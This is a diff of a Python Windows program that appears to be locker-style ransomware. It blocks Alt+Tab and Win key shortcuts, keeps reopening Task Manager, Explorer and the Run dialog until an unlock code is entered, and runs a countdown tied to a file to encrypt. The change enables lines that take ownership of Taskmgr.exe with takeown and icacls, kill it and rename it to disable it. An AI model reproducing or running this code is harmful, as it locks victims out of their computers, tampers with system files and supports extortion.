@@ -14,7 +14,6 @@ from tkinter import *
 from PIL import Image, ImageTk
 import socket
 
-
 keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
 keyboard.add_hotkey("win + r", lambda: None, suppress=True)
 keyboard.add_hotkey("win + e", lambda: None, suppress=True)
@@ -62,12 +61,12 @@ def on_closing():
 
 def open_windows_cyclically():
     while not is_code_entered:
-        open_task_manager()  # Открыть диспетчер задач
-        time.sleep(0)  # возможность добавить задержку
-        open_file_explorer()  # Открыть Проводник
-        time.sleep(0)  # возможность добавить задержку
-        open_run_dialog()  # Открыть диалог "Выполнить"
-        time.sleep(0)  # возможность добавить задержку
+        open_task_manager()  
+        time.sleep(0)  
+        open_file_explorer()  
+        time.sleep(0)  
+        open_run_dialog()  
+        time.sleep(0)  
 
 def countdown_thread(seconds, file_to_encrypt):
     while seconds > 0 and not is_code_entered:
@@ -123,13 +122,13 @@ pygame.mixer.music.play(-1)
 countdown_thread = threading.Thread(target=countdown_thread, args=(seconds_to_countdown, file_to_encrypt))
 countdown_thread.start()
  
-#path1 = "C:\Windows\System32\Taskmgr.exe"
-#path2 = "C:\Windows\System32\Taskmgr1.exe"
-#os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
-#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
-#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") 
-#os.system("taskkill /im taskmgr.exe") 
-#os.rename(path1, path2)
+path1 = "C:\Windows\System32\Taskmgr.exe"
+path2 = "C:\Windows\System32\Taskmgr1.exe"
+os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
+os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
+os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") 
+os.system("taskkill /im taskmgr.exe") 
+os.rename(path1, path2)
 
 
 
